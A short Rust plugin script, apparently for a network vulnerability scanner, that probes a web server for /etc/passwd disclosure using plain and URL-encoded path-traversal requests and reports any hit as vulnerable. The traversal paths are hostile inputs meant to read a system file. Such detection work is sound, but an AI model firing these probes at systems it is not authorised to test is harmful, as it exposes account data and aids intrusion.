/* http-passwd-2 - probe for /etc/passwd disclosure */
#![allow(dead_code)]
mod arsenal;
use arsenal::*;

#[no_mangle]
pub extern "C" fn almap_script_run(ctx: *mut AlScriptContext) -> i32 {
    let paths = ["/etc/passwd", "/../../etc/passwd", "/..%2f..%2f..%2fetc/passwd"];
    let mut found = 0usize;
    for p in paths.iter() {
        let resp = match http_request(ctx, "GET", p, None, "", "", None, 8192) {
            Some(r) if !r.is_empty() => r,
            _ => continue,
        };
        if contains_ci(http_body(&resp), "root:") {
            append_out(ctx, &format!("{}{}",
                if found == 0 { "VULNERABLE: " } else { ", " }, p));
            found += 1;
        }
    }
    if found == 0 {
        set_out(ctx, "not vulnerable: /etc/passwd disclosure");
    } else {
        append_out(ctx, " (/etc/passwd disclosure)");
    }
    0
}
